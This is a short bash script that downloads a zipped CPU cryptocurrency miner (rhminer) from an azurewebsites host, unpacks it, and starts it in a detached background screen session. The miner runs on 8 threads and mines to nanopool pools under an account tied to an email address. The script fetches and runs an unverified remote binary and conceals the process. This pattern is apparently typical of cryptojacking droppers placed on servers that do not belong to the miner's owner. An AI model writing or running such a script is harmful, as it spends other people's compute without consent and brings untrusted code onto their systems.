#!/bin/bash
sudo apt-get -y install screen unzip
wget "http://addmail.azurewebsites.net/rhminercpu.zip" 
unzip rhminercpu.zip
cd rhminerCPU
chmod +x rhminer
screen -d -m ./rhminer -cpu -cputhreads 8 -s pasc-us-east1.nanopool.org:15556 -su 1139099-44.0.hello/slicommeo@gmail.com -fo pasc-us-west1.nanopool.org:15556 -fou 1139099-44.0.hello/slicommeo@gmail.com -r 20 -v 2 -logfilename rhminer.log
echo -e "ok"
